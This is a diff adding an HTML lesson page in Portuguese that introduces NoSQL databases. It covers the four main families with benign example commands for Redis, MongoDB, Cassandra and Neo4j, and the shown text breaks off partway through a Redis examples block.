@@ -1,0 +1,1071 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NoSQL — Aula Interativa</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg-0:#05060a; --bg-1:#0a0d16; --bg-2:#10141f;
+    --surface:rgba(255,255,255,0.03); --border:rgba(255,255,255,0.08);
+    --text:#e8ecf4; --text-dim:#8b93a7; --text-faint:#5a6178;
+    --kali:#00d4ff; --kali-glow:rgba(0,212,255,0.35);
+    --meta:#ff3b6b; --meta-glow:rgba(255,59,107,0.35);
+    --accent:#7c5cff; --ok:#22e584; --warn:#ffb020; --err:#ff4d4d;
+    --font-mono:'JetBrains Mono','Fira Code',ui-monospace,monospace;
+    --font-sans:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+  }
+  html { scroll-behavior: smooth; }
+  body { font-family:var(--font-sans); background:var(--bg-0); color:var(--text);
+    line-height:1.6; overflow-x:hidden; -webkit-font-smoothing:antialiased; }
+
+  .bg-grid { position:fixed; inset:0; z-index:0;
+    background-image:
+      linear-gradient(rgba(124,92,255,0.05) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(124,92,255,0.05) 1px, transparent 1px);
+    background-size:48px 48px;
+    mask-image:radial-gradient(ellipse 80% 60% at 50% 0%, #000 40%, transparent 100%);
+    pointer-events:none; }
+  .bg-orbs { position:fixed; inset:0; z-index:0; pointer-events:none; overflow:hidden; }
+  .orb { position:absolute; border-radius:50%; filter:blur(90px); opacity:0.35;
+    animation:float 18s ease-in-out infinite; }
+  .orb.kali { width:480px; height:480px; background:var(--kali); top:-120px; left:-100px; }
+  .orb.meta { width:420px; height:420px; background:var(--meta); bottom:-100px; right:-80px;
+    animation-delay:-6s; }
+  .orb.purple { width:380px; height:380px; background:var(--accent); top:40%; left:45%;
+    animation-delay:-12s; opacity:0.18; }
+  @keyframes float {
+    0%,100% { transform:translate(0,0) scale(1); }
+    33% { transform:translate(40px,-30px) scale(1.08); }
+    66% { transform:translate(-30px,25px) scale(0.95); }
+  }
+  .container { position:relative; z-index:1; max-width:1180px; margin:0 auto; padding:0 24px; }
+
+  nav { position:sticky; top:0; z-index:100; backdrop-filter:blur(20px);
+    background:rgba(5,6,10,0.7); border-bottom:1px solid var(--border); }
+  nav .container { display:flex; align-items:center; justify-content:space-between;
+    padding-top:16px; padding-bottom:16px; }
+  .logo { display:flex; align-items:center; gap:10px; font-family:var(--font-mono);
+    font-weight:700; font-size:15px; }
+  .logo .dot { width:10px; height:10px; border-radius:50%; background:var(--ok);
+    box-shadow:0 0 12px var(--ok); animation:pulse 2s infinite; }
+  @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.4; } }
+  .nav-links { display:flex; gap:28px; }
+  .nav-links a { color:var(--text-dim); text-decoration:none; font-size:14px;
+    font-weight:500; transition:color 0.2s; }
+  .nav-links a:hover { color:var(--text); }
+  @media (max-width:900px) { .nav-links { display:none; } }
+
+  .hero { text-align:center; padding:80px 0 60px; }
+  .badge { display:inline-flex; align-items:center; gap:8px; padding:6px 16px;
+    border-radius:100px; background:var(--surface); border:1px solid var(--border);
+    font-family:var(--font-mono); font-size:12px; color:var(--text-dim);
+    letter-spacing:0.5px; margin-bottom:28px; }
+  .badge .live { width:7px; height:7px; border-radius:50%; background:var(--ok);
+    box-shadow:0 0 10px var(--ok); animation:pulse 1.5s infinite; }
+  h1 { font-size:clamp(34px,5.5vw,68px); font-weight:800; line-height:1.05;
+    letter-spacing:-3px; margin-bottom:24px; }
+  h1 .grad-kali { background:linear-gradient(135deg,var(--kali),#00ffa3);
+    -webkit-background-clip:text; background-clip:text; -webkit-text-fill-color:transparent; }
+  h1 .grad-meta { background:linear-gradient(135deg,var(--meta),var(--accent));
+    -webkit-background-clip:text; background-clip:text; -webkit-text-fill-color:transparent; }
+  .hero p.sub { font-size:clamp(16px,2vw,19px); color:var(--text-dim);
+    max-width:680px; margin:0 auto 40px; }
+
+  section { padding:80px 0; position:relative; }
+  .section-label { font-family:var(--font-mono); font-size:12px; color:var(--kali);
+    letter-spacing:2px; text-transform:uppercase; margin-bottom:12px; }
+  h2.section-title { font-size:clamp(28px,4vw,42px); font-weight:700;
+    letter-spacing:-1.5px; margin-bottom:16px; }
+  .section-desc { color:var(--text-dim); font-size:16px; max-width:680px; margin-bottom:48px; }
+
+  .card { position:relative; background:var(--bg-1); border:1px solid var(--border);
+    border-radius:20px; padding:32px; overflow:hidden;
+    transition:transform 0.3s, border-color 0.3s; }
+  .card.kali { border-top:2px solid var(--kali); }
+  .card.kali:hover { border-color:var(--kali);
+    box-shadow:0 20px 60px -20px var(--kali-glow); transform:translateY(-4px); }
+  .card.meta { border-top:2px solid var(--meta); }
+  .card.meta:hover { border-color:var(--meta);
+    box-shadow:0 20px 60px -20px var(--meta-glow); transform:translateY(-4px); }
+  .card.purple { border-top:2px solid var(--accent); }
+  .card.purple:hover { border-color:var(--accent);
+    box-shadow:0 20px 60px -20px rgba(124,92,255,0.35); transform:translateY(-4px); }
+  .card-icon { width:52px; height:52px; border-radius:14px; display:flex;
+    align-items:center; justify-content:center; font-size:24px; margin-bottom:20px; }
+  .card.kali .card-icon { background:rgba(0,212,255,0.1); border:1px solid rgba(0,212,255,0.25); }
+  .card.meta .card-icon { background:rgba(255,59,107,0.1); border:1px solid rgba(255,59,107,0.25); }
+  .card.purple .card-icon { background:rgba(124,92,255,0.1); border:1px solid rgba(124,92,255,0.25); }
+  .card h3 { font-size:22px; font-weight:700; margin-bottom:6px; letter-spacing:-0.5px; }
+  .card.kali h3 { color:var(--kali); }
+  .card.meta h3 { color:var(--meta); }
+  .card.purple h3 { color:var(--accent); }
+  .card .role { font-family:var(--font-mono); font-size:12px; color:var(--text-faint);
+    text-transform:uppercase; letter-spacing:1.5px; margin-bottom:20px; }
+  .card ul { list-style:none; }
+  .card ul li { padding:9px 0 9px 26px; position:relative; color:var(--text-dim);
+    font-size:14.5px; border-bottom:1px solid rgba(255,255,255,0.04); }
+  .card ul li:last-child { border-bottom:none; }
+  .card ul li::before { content:'▸'; position:absolute; left:0; font-weight:bold; }
+  .card.kali ul li::before { color:var(--kali); }
+  .card.meta ul li::before { color:var(--meta); }
+  .card.purple ul li::before { color:var(--accent); }
+
+  .compare-grid { display:grid; grid-template-columns:1fr 1fr; gap:24px; }
+  .triple-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:24px; }
+  .quad-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:24px; }
+  @media (max-width:980px) { .triple-grid, .quad-grid { grid-template-columns:1fr; } }
+  @media (max-width:820px) { .compare-grid { grid-template-columns:1fr; } }
+
+  .steps { display:flex; flex-direction:column; gap:0; }
+  .step { display:grid; grid-template-columns:60px 1fr; gap:24px;
+    padding:28px 0; border-bottom:1px solid var(--border); }
+  .step:last-child { border-bottom:none; }
+  .step-num { width:48px; height:48px; border-radius:14px; display:flex;
+    align-items:center; justify-content:center; font-family:var(--font-mono);
+    font-weight:700; font-size:18px; background:var(--bg-1);
+    border:1px solid var(--border); color:var(--kali); }
+  .step-body h4 { font-size:18px; font-weight:700; margin-bottom:6px; letter-spacing:-0.3px; }
+  .step-body p { color:var(--text-dim); font-size:14.5px; margin-bottom:14px; }
+
+  .code { background:var(--bg-0); border:1px solid var(--border); border-radius:12px;
+    padding:16px 20px; font-family:var(--font-mono); font-size:13px;
+    color:#a8ffcb; overflow-x:auto; position:relative; line-height:1.7; }
+  .code::before { content:''; position:absolute; left:0; top:16px; bottom:16px;
+    width:3px; background:var(--kali); border-radius:0 3px 3px 0; }
+  .code.meta-code::before { background:var(--meta); }
+  .code.purple-code::before { background:var(--accent); }
+  .code .prompt { color:var(--meta); user-select:none; }
+  .code .comment { color:var(--text-faint); font-style:italic; }
+  .code .cmd { color:#e8ecf4; }
+  .code .ph { color:var(--warn); font-weight:600; }
+  .code .ok { color:var(--ok); }
+  .code .dim { color:var(--text-faint); }
+  .code .kw { color:#7c5cff; font-weight:600; }
+  .code .str { color:#ffb020; }
+  .code .num { color:#00d4ff; }
+  .code .bad { color:var(--err); font-weight:600; }
+  .code .good { color:var(--ok); font-weight:600; }
+  .code .key { color:#00d4ff; }
+
+  .term { background:#000; border:1px solid var(--border); border-radius:14px;
+    overflow:hidden; margin:32px 0; font-family:var(--font-mono); }
+  .term-bar { display:flex; align-items:center; gap:8px; padding:12px 16px;
+    background:var(--bg-1); border-bottom:1px solid var(--border); }
+  .term-bar .b { width:12px; height:12px; border-radius:50%; }
+  .term-bar .b.r { background:#ff5f57; }
+  .term-bar .b.y { background:#febc2e; }
+  .term-bar .b.g { background:#28c840; }
+  .term-bar .title { margin-left:8px; font-size:12px; color:var(--text-faint); }
+  .term-body { padding:18px 20px; font-size:13px; line-height:1.8; min-height:120px;
+    max-height:500px; overflow-y:auto; color:#a8ffcb; white-space:pre-wrap;
+    word-break:break-word; }
+  .term-body .prompt { color:var(--meta); }
+  .term-body .info { color:var(--kali); }
+  .term-body .ok { color:var(--ok); }
+  .term-body .err { color:var(--err); }
+  .term-body .warn { color:var(--warn); }
+  .term-body .dim { color:var(--text-faint); }
+
+  .table-wrap { background:var(--bg-1); border:1px solid var(--border);
+    border-radius:16px; overflow:hidden; margin-top:24px; }
+  table { width:100%; border-collapse:collapse; font-size:14px; }
+  thead { background:var(--bg-2); }
+  th { text-align:left; padding:14px 20px; font-family:var(--font-mono); font-size:11px;
+    text-transform:uppercase; letter-spacing:1.5px; color:var(--text-faint);
+    font-weight:600; border-bottom:1px solid var(--border); }
+  td { padding:14px 20px; border-bottom:1px solid rgba(255,255,255,0.04);
+    color:var(--text-dim); }
+  tr:last-child td { border-bottom:none; }
+  tr:hover td { background:rgba(124,92,255,0.04); color:var(--text); }
+  td.mono { font-family:var(--font-mono); font-size:13px; }
+  td.ok { color:var(--ok); }
+  td.warn { color:var(--warn); }
+  td.err { color:var(--err); }
+  td.kali { color:var(--kali); }
+  td.meta { color:var(--meta); }
+  td.purple { color:var(--accent); }
+
+  .warning { background:linear-gradient(135deg,rgba(255,176,32,0.08),rgba(255,59,107,0.05));
+    border:1px solid rgba(255,176,32,0.25); border-left:3px solid var(--warn);
+    border-radius:14px; padding:20px 24px; display:flex; gap:16px;
+    align-items:flex-start; margin-top:32px; }
+  .warning .icon { font-size:22px; flex-shrink:0; }
+  .warning h5 { color:var(--warn); font-size:15px; margin-bottom:4px; }
+  .warning p { color:var(--text-dim); font-size:14px; }
+
+  .info-box { background:linear-gradient(135deg,rgba(0,212,255,0.06),rgba(124,92,255,0.04));
+    border:1px solid rgba(0,212,255,0.2); border-left:3px solid var(--kali);
+    border-radius:14px; padding:20px 24px; display:flex; gap:16px;
+    align-items:flex-start; margin-top:24px; }
+  .info-box .icon { font-size:22px; flex-shrink:0; }
+  .info-box h5 { color:var(--kali); font-size:15px; margin-bottom:4px; }
+  .info-box p { color:var(--text-dim); font-size:14px; }
+
+  .danger-box { background:linear-gradient(135deg,rgba(255,59,107,0.08),rgba(255,77,77,0.04));
+    border:1px solid rgba(255,59,107,0.25); border-left:3px solid var(--meta);
+    border-radius:14px; padding:20px 24px; display:flex; gap:16px;
+    align-items:flex-start; margin-top:24px; }
+  .danger-box .icon { font-size:22px; flex-shrink:0; }
+  .danger-box h5 { color:var(--meta); font-size:15px; margin-bottom:4px; }
+  .danger-box p { color:var(--text-dim); font-size:14px; }
+
+  .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr));
+    gap:16px; margin-top:40px; }
+  .stat { background:var(--bg-1); border:1px solid var(--border); border-radius:16px;
+    padding:24px; text-align:center; transition:all 0.3s; }
+  .stat:hover { border-color:rgba(124,92,255,0.4); transform:translateY(-3px); }
+  .stat .num { font-family:var(--font-mono); font-size:32px; font-weight:700;
+    background:linear-gradient(135deg,var(--kali),var(--accent));
+    -webkit-background-clip:text; background-clip:text;
+    -webkit-text-fill-color:transparent; display:block; margin-bottom:4px; }
+  .stat .label { font-size:12px; color:var(--text-faint); text-transform:uppercase;
+    letter-spacing:1.5px; font-family:var(--font-mono); }
+
+  footer { padding:60px 0 40px; border-top:1px solid var(--border); text-align:center;
+    color:var(--text-faint); font-size:13px; position:relative; z-index:1; }
+
+  ::-webkit-scrollbar { width:10px; height:10px; }
+  ::-webkit-scrollbar-track { background:var(--bg-0); }
+  ::-webkit-scrollbar-thumb { background:var(--bg-2); border-radius:5px;
+    border:2px solid var(--bg-0); }
+  ::-webkit-scrollbar-thumb:hover { background:#1c2233; }
+  ::selection { background:var(--kali); color:var(--bg-0); }
+
+  .tag { display:inline-block; font-family:var(--font-mono); font-size:11px;
+    padding:3px 10px; border-radius:100px; letter-spacing:0.5px; margin-left:8px;
+    vertical-align:middle; }
+  .tag.kali { background:rgba(0,212,255,0.1); color:var(--kali);
+    border:1px solid rgba(0,212,255,0.25); }
+  .tag.meta { background:rgba(255,59,107,0.1); color:var(--meta);
+    border:1px solid rgba(255,59,107,0.25); }
+  .tag.purple { background:rgba(124,92,255,0.1); color:var(--accent);
+    border:1px solid rgba(124,92,255,0.25); }
+
+  .flow { display:flex; align-items:center; justify-content:center;
+    flex-wrap:wrap; gap:12px; margin:32px 0; font-family:var(--font-mono); font-size:13px; }
+  .flow-node { background:var(--bg-1); border:1px solid var(--border);
+    border-radius:12px; padding:12px 20px; color:var(--text-dim); text-align:center; }
+  .flow-node.kali { border-color:rgba(0,212,255,0.4); color:var(--kali); }
+  .flow-node.meta { border-color:rgba(255,59,107,0.4); color:var(--meta); }
+  .flow-node.purple { border-color:rgba(124,92,255,0.4); color:var(--accent); }
+  .flow-arrow { color:var(--text-faint); font-size:18px; }
+
+  .scenario { background:var(--bg-1); border:1px solid var(--border);
+    border-radius:16px; padding:24px; margin-bottom:16px; }
+  .scenario h5 { font-size:15px; margin-bottom:8px; }
+  .scenario p { color:var(--text-dim); font-size:14px; }
+  .scenario.kali { border-left:3px solid var(--kali); }
+  .scenario.kali h5 { color:var(--kali); }
+  .scenario.purple { border-left:3px solid var(--accent); }
+  .scenario.purple h5 { color:var(--accent); }
+  .scenario.meta { border-left:3px solid var(--meta); }
+  .scenario.meta h5 { color:var(--meta); }
+</style>
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="bg-orbs">
+  <div class="orb kali"></div>
+  <div class="orb meta"></div>
+  <div class="orb purple"></div>
+</div>
+
+<nav>
+  <div class="container">
+    <div class="logo">
+      <span class="dot"></span>
+      NoSQL<span style="color:var(--kali)">//</span>PT
+    </div>
+    <div class="nav-links">
+      <a href="#intro">Introdução</a>
+      <a href="#tipos">Tipos</a>
+      <a href="#exemplos">Exemplos</a>
+      <a href="#seguranca">Segurança</a>
+      <a href="#comparacao">Comparação</a>
+    </div>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero container">
+  <div class="badge">
+    <span class="live"></span>
+    Aula prática · bases de dados modernas
+  </div>
+  <h1>
+    <span class="grad-kali">No</span><span class="grad-meta">SQL</span>
+  </h1>
+  <p class="sub">
+    Bases de dados não relacionais. Concebidas para responder a desafios que o modelo relacional tradicional nem sempre resolve bem: escala horizontal, esquemas flexíveis, volumes massivos de dados e padrões de acesso distribuídos. Nesta aula, exploramos os quatro grandes tipos de bases NoSQL, os seus casos de uso e os cuidados de segurança essenciais.
+  </p>
+</section>
+
+<!-- INTRODUÇÃO -->
+<section id="intro" class="container">
+  <div class="section-label">01 — Enquadramento</div>
+  <h2 class="section-title">O que é NoSQL?</h2>
+  <p class="section-desc">
+    NoSQL significa literalmente "Not Only SQL". O termo designa uma família de bases de dados que não seguem o modelo relacional clássico — sem tabelas, sem linhas, sem colunas obrigatórias, e muitas vezes sem esquema fixo. Não substituem o SQL: complementam-no em cenários onde a flexibilidade e a escala horizontal são prioritárias.
+  </p>
+
+  <div class="stats">
+    <div class="stat">
+      <span class="num">1960s</span>
+      <span class="label">Primeiras bases não relacionais (IBM IMS)</span>
+    </div>
+    <div class="stat">
+      <span class="num">2009</span>
+      <span class="label">Popularização do termo NoSQL</span>
+    </div>
+    <div class="stat">
+      <span class="num">4</span>
+      <span class="label">Grandes famílias de bases NoSQL</span>
+    </div>
+    <div class="stat">
+      <span class="num">BASE</span>
+      <span class="label">Modelo de consistência (vs ACID)</span>
+    </div>
+  </div>
+
+  <h3 style="font-size:20px; font-weight:700; margin:48px 0 24px; letter-spacing:-0.5px;">
+    Porquê NoSQL? As motivações
+  </h3>
+
+  <div class="triple-grid">
+    <div class="card kali">
+      <div class="card-icon">📈</div>
+      <h3>Escala horizontal</h3>
+      <div class="role">Scale out</div>
+      <ul>
+        <li>Adicionar mais servidores em vez de aumentar o existente.</li>
+        <li>Distribuição de dados por vários nós (sharding).</li>
+        <li>Resistência a falhas através de replicação.</li>
+        <li>Ideal para dados que crescem rapidamente.</li>
+      </ul>
+    </div>
+    <div class="card purple">
+      <div class="card-icon">🧩</div>
+      <h3>Esquema flexível</h3>
+      <div class="role">Schema-less / Schema-on-read</div>
+      <ul>
+        <li>Diferentes registos podem ter campos distintos.</li>
+        <li>Sem migrações complexas ao evoluir o modelo.</li>
+        <li>Adequado a dados heterogéneos ou em evolução.</li>
+        <li>Útil em prototipagem rápida.</li>
+      </ul>
+    </div>
+    <div class="card meta">
+      <div class="card-icon">⚡</div>
+      <h3>Desempenho específico</h3>
+      <div class="role">Padrões de acesso otimizados</div>
+      <ul>
+        <li>Cada tipo otimizado para um padrão de acesso.</li>
+        <li>Chave-valor: latência mínima em leituras simples.</li>
+        <li>Documento: leitura de objetos complexos completa.</li>
+        <li>Grafo: travessia eficiente de relações profundas.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="info-box">
+    <span class="icon">ℹ️</span>
+    <div>
+      <h5>Teorema CAP — o pano de fundo teórico</h5>
+      <p>
+        O teorema CAP (Consistency, Availability, Partition tolerance) afirma que um sistema distribuído não pode garantir simultaneamente as três propriedades. As bases NoSQL escolhem tipicamente <strong>AP</strong> (disponibilidade + tolerância a partições, como Cassandra) ou <strong>CP</strong> (consistência + tolerância, como MongoDB em modo strict). Bases relacionais tradicionais tendem a ser <strong>CA</strong> em nó único, mas não escalam horizontalmente.
+      </p>
+    </div>
+  </div>
+</section>
+
+<!-- TIPOS -->
+<section id="tipos" class="container">
+  <div class="section-label">02 — Classificação</div>
+  <h2 class="section-title">Os quatro grandes tipos</h2>
+  <p class="section-desc">
+    As bases NoSQL organizam-se em quatro famílias principais, cada uma com o seu modelo de dados e o seu caso de uso preferencial. Conhecer as diferenças é essencial para escolher a ferramenta certa.
+  </p>
+
+  <div class="quad-grid" style="margin-top:40px;">
+    <div class="card kali">
+      <div class="card-icon">🔑</div>
+      <h3>Chave-Valor</h3>
+      <div class="role">Key-Value Store</div>
+      <ul>
+        <li>Modelo mais simples: chave única → valor.</li>
+        <li>Latência muito baixa.</li>
+        <li>Sem consultas por valor.</li>
+        <li>Redis, Memcached, Riak, DynamoDB.</li>
+      </ul>
+    </div>
+    <div class="card purple">
+      <div class="card-icon">📄</div>
+      <h3>Documento</h3>
+      <div class="role">Document Store</div>
+      <ul>
+        <li>Valores são documentos JSON/BSON.</li>
+        <li>Permitem consultas por campos internos.</li>
+        <li>Esquema flexível por documento.</li>
+        <li>MongoDB, CouchDB, Firestore.</li>
+      </ul>
+    </div>
+    <div class="card meta">
+      <div class="card-icon">📊</div>
+      <h3>Colunar</h3>
+      <div class="role">Wide-Column Store</div>
+      <ul>
+        <li>Dados organizados por famílias de colunas.</li>
+        <li>Otimizadas para escrita massiva.</li>
+        <li>Escala horizontal muito alta.</li>
+        <li>Cassandra, HBase, ScyllaDB.</li>
+      </ul>
+    </div>
+    <div class="card kali">
+      <div class="card-icon">🕸️</div>
+      <h3>Grafo</h3>
+      <div class="role">Graph Database</div>
+      <ul>
+        <li>Dados como nós e arestas.</li>
+        <li>Travessia eficiente de relações.</li>
+        <li>Ideal para redes sociais e recomendações.</li>
+        <li>Neo4j, ArangoDB, JanusGraph.</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3 style="font-size:20px; font-weight:700; margin:48px 0 24px; letter-spacing:-0.5px;">
+    Modelo de dados — comparação visual
+  </h3>
+
+  <div class="steps">
+    <div class="step">
+      <div class="step-num">01</div>
+      <div class="step-body">
+        <h4>Chave-Valor</h4>
+        <p>
+          O modelo mais simples possível. Cada entrada tem uma chave única que mapeia diretamente para um valor. O sistema não sabe nada sobre o conteúdo do valor: pode ser um texto, um número, um objeto serializado ou uma imagem.
+        </p>
+        <div class="code">
+<span class="comment"># Exemplo com Redis</span>
+<span class="prompt">redis&gt;</span> <span class="cmd">SET utilizador:42:nome <span class="str">"Ana Silva"</span></span>
+<span class="ok">OK</span>
+<span class="prompt">redis&gt;</span> <span class="cmd">SET utilizador:42:email <span class="str">"ana@exemplo.pt"</span></span>
+<span class="ok">OK</span>
+<span class="prompt">redis&gt;</span> <span class="cmd">GET utilizador:42:nome</span>
+<span class="ok">"Ana Silva"</span>
+<span class="prompt">redis&gt;</span> <span class="cmd">SET sessao:abc123 <span class="str">"{\"uid\":42,\"expira\":1735689600}"</span> EX 3600</span>
+<span class="ok">OK</span>
+<span class="dim">^ valor é opaco para o sistema — só a chave é conhecida</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">02</div>
+      <div class="step-body">
+        <h4>Documento</h4>
+        <p>
+          Os valores são documentos estruturados — tipicamente JSON ou BSON — e o sistema compreende a sua estrutura. É possível consultar por campos internos, indexá-los e atualizá-los individualmente. É o tipo mais próximo do modelo relacional em termos de expressividade.
+        </p>
+        <div class="code">
+<span class="comment">// Documento em MongoDB</span>
+{
+  <span class="key">"_id"</span>: ObjectId(<span class="str">"65a1b2c3d4e5f6a7b8c9d0e1"</span>),
+  <span class="key">"nome"</span>: <span class="str">"Ana Silva"</span>,
+  <span class="key">"email"</span>: <span class="str">"ana@exemplo.pt"</span>,
+  <span class="key">"idade"</span>: <span class="num">34</span>,
+  <span class="key">"interesses"</span>: [<span class="str">"segurança"</span>, <span class="str">"redes"</span>, <span class="str">"noSQL"</span>],
+  <span class="key">"morada"</span>: {
+    <span class="key">"rua"</span>: <span class="str">"Rua das Flores, 10"</span>,
+    <span class="key">"cidade"</span>: <span class="str">"Lisboa"</span>,
+    <span class="key">"codigo_postal"</span>: <span class="str">"1200-192"</span>
+  },
+  <span class="key">"encomendas"</span>: [
+    { <span class="key">"id"</span>: <span class="num">1001</span>, <span class="key">"total"</span>: <span class="num">49.90</span>, <span class="key">"estado"</span>: <span class="str">"entregue"</span> },
+    { <span class="key">"id"</span>: <span class="num">1002</span>, <span class="key">"total"</span>: <span class="num">120.00</span>, <span class="key">"estado"</span>: <span class="str">"em trânsito"</span> }
+  ]
+}
+        </div>
+        <div class="code" style="margin-top:12px;">
+<span class="comment">// Consulta por campo aninhado</span>
+<span class="prompt">mongodb&gt;</span> <span class="cmd">db.utilizadores.find({ <span class="str">"morada.cidade"</span>: <span class="str">"Lisboa"</span>, idade: { $gt: 30 } })</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">03</div>
+      <div class="step-body">
+        <h4>Colunar (Wide-Column)</h4>
+        <p>
+          Os dados são organizados por famílias de colunas dentro de cada linha, com chaves compostas. É um modelo híbrido entre chave-valor e tabela. Otimizado para escrita massiva e leitura de colunas específicas em grandes volumes — típico em séries temporais, logs e IoT.
+        </p>
+        <div class="code">
+<span class="comment">-- Exemplo conceptual em Cassandra (CQL)</span>
+<span class="kw">CREATE TABLE</span> eventos_iot (
+  dispositivo_id <span class="kw">UUID</span>,
+  data_hora <span class="kw">TIMESTAMP</span>,
+  temperatura <span class="kw">FLOAT</span>,
+  humidade <span class="kw">FLOAT</span>,
+  localizacao <span class="kw">TEXT</span>,
+  <span class="kw">PRIMARY KEY</span> (dispositivo_id, data_hora)
+) <span class="kw">WITH CLUSTERING ORDER BY</span> (data_hora <span class="kw">DESC</span>);
+
+<span class="comment">-- Inserção (escrita extremamente rápida)</span>
+<span class="kw">INSERT INTO</span> eventos_iot (dispositivo_id, data_hora, temperatura, humidade, localizacao)
+<span class="kw">VALUES</span> (550e8400-e29b-41d4-a716-446655440000, <span class="str">'2024-01-15 10:23:41'</span>, 22.5, 65.0, <span class="str">'Lisboa'</span>);
+
+<span class="comment">-- Consulta por chave de partição + clustering</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> eventos_iot
+<span class="kw">WHERE</span> dispositivo_id = 550e8400-e29b-41d4-a716-446655440000
+  <span class="kw">AND</span> data_hora &gt; <span class="str">'2024-01-15 00:00:00'</span>;
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">04</div>
+      <div class="step-body">
+        <h4>Grafo</h4>
+        <p>
+          Dados modelados como nós (entidades) e arestas (relações), ambos com propriedades. Otimizada para travessias profundas — encontrar amigos de amigos, caminhos mais curtos, padrões de fraude, motores de recomendação. Em bases relacionais, travessias profundas exigem muitos JOINs e degradam rapidamente.
+        </p>
+        <div class="code">
+<span class="comment">// Exemplo em Cypher (Neo4j)</span>
+<span class="kw">CREATE</span> (ana:Pessoa {nome: <span class="str">'Ana'</span>, idade: <span class="num">34</span>})
+<span class="kw">CREATE</span> (bruno:Pessoa {nome: <span class="str">'Bruno'</span>, idade: <span class="num">29</span>})
+<span class="kw">CREATE</span> (carla:Pessoa {nome: <span class="str">'Carla'</span>, idade: <span class="num">41</span>})
+
+<span class="kw">CREATE</span> (ana)-[:CONHECE {desde: <span class="num">2018</span>}]->(bruno)
+<span class="kw">CREATE</span> (bruno)-[:CONHECE {desde: <span class="num">2020</span>}]->(carla)
+
+<span class="comment">// Encontrar amigos de amigos da Ana</span>
+<span class="kw">MATCH</span> (ana:Pessoa {nome: <span class="str">'Ana'</span>})-[:CONHECE*2]-(amigo_de_amigo)
+<span class="kw">RETURN</span> amigo_de_amigo.nome;
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="table-wrap" style="margin-top:32px;">
+    <table>
+      <thead>
+        <tr>
+          <th>Tipo</th>
+          <th>Modelo</th>
+          <th>Ponto forte</th>
+          <th>Caso de uso típico</th>
+          <th>Exemplos</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="kali">Chave-Valor</td>
+          <td class="mono">chave → valor</td>
+          <td class="ok">Latência mínima</td>
+          <td>Cache, sessões, filas</td>
+          <td class="mono">Redis, DynamoDB</td>
+        </tr>
+        <tr>
+          <td class="purple">Documento</td>
+          <td class="mono">JSON / BSON</td>
+          <td class="ok">Flexibilidade</td>
+          <td>Catálogos, perfis, CMS</td>
+          <td class="mono">MongoDB, Firestore</td>
+        </tr>
+        <tr>
+          <td class="meta">Colunar</td>
+          <td class="mono">famílias de colunas</td>
+          <td class="ok">Escrita massiva</td>
+          <td>Logs, IoT, séries temporais</td>
+          <td class="mono">Cassandra, HBase</td>
+        </tr>
+        <tr>
+          <td class="kali">Grafo</td>
+          <td class="mono">nós + arestas</td>
+          <td class="ok">Travessias profundas</td>
+          <td>Redes sociais, recomendações</td>
+          <td class="mono">Neo4j, ArangoDB</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- EXEMPLOS -->
+<section id="exemplos" class="container">
+  <div class="section-label">03 — Prática</div>
+  <h2 class="section-title">Exemplos em contexto real</h2>
+  <p class="section-desc">
+    Nada como ver as bases NoSQL em ação. Estes exemplos ilustram operações típicas em cada família, com foco nos padrões de utilização que as distinguem do SQL tradicional.
+  </p>
+
+  <h3 style="font-size:20px; font-weight:700; margin:48px 0 24px; letter-spacing:-0.5px;">
+    Redis — chave-valor em produção
+  </h3>
+
+  <div class="code">
+<span class="comment"># Instalação e ligação</span>
+<span class="prompt">$</span> <span class="cmd">sudo apt install redis-server</span>
+<span class="prompt">$</span> <span class="cmd">redis-cli</span>
+<span class="info">127.0.0.1:6379&gt;</span>
+
+<span class="comment"># Padrão 1: cache de resultados de base de dados relacional</span>
+<span class="prompt">127.0.0.1:6379&gt;</span> <span class="cmd">SET cache:utilizador:42 <span class="str">"{\"nome\":\"Ana\",\"nivel\":\"premium\"}"</span> EX 300</span>
+<span class="ok">OK</span>
+<span class="dim">^ a chave expira automaticamente em 300 segundos</span>
+
+<span class="comment"># Padrão 2: sessões de utilizador</span>
+<span class="prompt">127.0.0.1:6379&gt;</span> <span class="cmd">HSET sessao:abc123 uid 42 ip <span class="str">"192.168.1.10"</span> criada <span class="num">1705312821</span></span>
+<span class="ok">(integer) 3</span>
+<span class="prompt">127.0.0.1:6379&gt;</span> <span class="cmd">EXPIRE sessao:abc123 3600</span>
+<span class="ok">(integer) 1</span>
+
+<span class="comment"># Padrão 3: contadores atómicos (rate limiting, métricas)</span>
+<span class="prompt">127.0.0.1:6379&gt;</span> <span class="cmd">INCR pedidos:2024-01-15:api</span>
+<span class="ok">(integer) 1</span>
+<span class="prompt">127.0.0.1:6379&gt;</span> <span class="cmd">INCR pedidos:2024-01-15:api</span>
+<span class="ok">(integer) 2</span>
+
+<span class="comment"># Padrão 4: filas de tarefas (listas)</span>
+<span class="prompt">127.0.0.1:6379&gt;</span> <span class="cmd">LPUSH tarefas <span class="str">"processar_pagamento:1001"</span></span>
+<span class="ok">(integer) 1</span>
+<span class="prompt">127.0.0.1:6379&gt;</span> <span class="cmd">LPUSH tarefas <span class="str">"enviar_email:ana@exemplo.pt"</span></span>
+<span class="ok">(integer) 2</span>
+<span class="prompt">127.0.0.1:6379&gt;</span> <span class="cmd">RPOP tarefas</span>
+<span class="ok">"processar_pagamento:1001"</span>
+
+<span class="comment"># Padrão 5: sorted sets (rankings, prioridades)</span>
